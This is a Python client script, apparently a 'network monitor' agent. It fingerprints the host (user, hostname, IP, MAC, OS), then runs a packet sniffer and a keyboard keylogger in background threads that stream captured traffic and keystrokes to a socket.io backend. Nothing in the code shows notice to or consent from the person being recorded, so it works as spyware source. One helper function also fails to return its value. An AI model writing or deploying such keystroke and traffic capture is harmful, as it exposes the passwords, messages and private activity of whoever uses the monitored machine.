import atexit
import os
import socket
import requests
import socketio
from threading import Thread
import platform
import uuid
import subprocess

from pynput import keyboard
from scapy.sendrecv import sniff

from recorder import handle_key_press, handle_key_release, send_batched_keystrokes
from sniffer import handle_sniffed_packets, send_batched_packets

HOST_IP = "127.0.0.1"
HOST_PORT = "3000"

BACKEND_URL = f"http://{HOST_IP}:{HOST_PORT}/api"

packets_buffer = []


def packets_thread_callback():
    send_batched_packets(sio)


def keystrokes_thread_callback():
    send_batched_keystrokes(BACKEND_URL)


def sniffer_thread_callback():
    sniff(prn=handle_sniffed_packets)


def on_exit():
    print("Disconnecting from server...")

    try:
        # TODO: try Disconnecting from network with data.
        sio.disconnect()
        print("Successfully Disconnected socket from server")
    except Exception as e:
        print(f"Failed Disconnecting socket from server {e}")


atexit.register(on_exit)


def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(("89.207.132.170", 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = "127.0.0.1"
    finally:
        s.close()
    return IP


def get_manufacturer():
    result = "N/A"

    match platform.system():
        case "Linux":
            try:
                with open("/sys/class/dmi/id/chassis_vendor", "r") as f:
                    result = f.read().strip()
            except FileNotFoundError:
                pass

        case "Windows":
            try:
                result = subprocess.check_output(
                    "wmic bios get manufacturer", shell=True, text=True
                ).strip()
            except subprocess.CalledProcessError:
                pass
        case "Darwin":
            try:
                result = (
                    subprocess.check_output(
                        "ioreg -l | grep -A 1 'VendorName'", shell=True, text=True
                    )
                    .split("\n")[1]
                    .strip()
                )
            except subprocess.CalledProcessError:
                pass


if __name__ == "__main__":
    print("Initializing Socket Server")

    print("Attempting Socket connection")
    sio = socketio.Client()

    try:
        requests.get(f"{BACKEND_URL}/socket.io")
    except Exception:
        pass

    sio.connect(
        BACKEND_URL,
        socketio_path="/api/socket.io",
        transports=["websocket"],
        retry=True,
    )

    node = {
        "user": os.getlogin(),
        "name": platform.node(),
        "type": "workstation",
        # "hostname": socket.gethostname(),
        "ip": get_ip(),
        "mac": ":".join(
            ["{:02x}".format((uuid.getnode() >> i) & 0xFF) for i in range(0, 8 * 6, 8)][
                ::-1
            ]
        ),
        "os": platform.system() + "  " + platform.release(),
        "manufacturer": get_manufacturer(),
    }

    sio.emit("join", ["Nodes", node])

    print("Starting Network Monitor...")
    # Start various threads
    packets_thread = Thread(target=packets_thread_callback, daemon=True)
    sniffer_thread = Thread(target=sniffer_thread_callback, daemon=True)
    logger_thread = Thread(target=keystrokes_thread_callback, daemon=True)

    print("Starting Sniffer Thread")
    packets_thread.start()
    sniffer_thread.start()
    print("Starting Key Logger Thread")
    logger_thread.start()
    with keyboard.Listener(
        on_press=handle_key_press, on_release=handle_key_release
    ) as key_recorder:
        print("Listening to keylogs...")
        key_recorder.join()
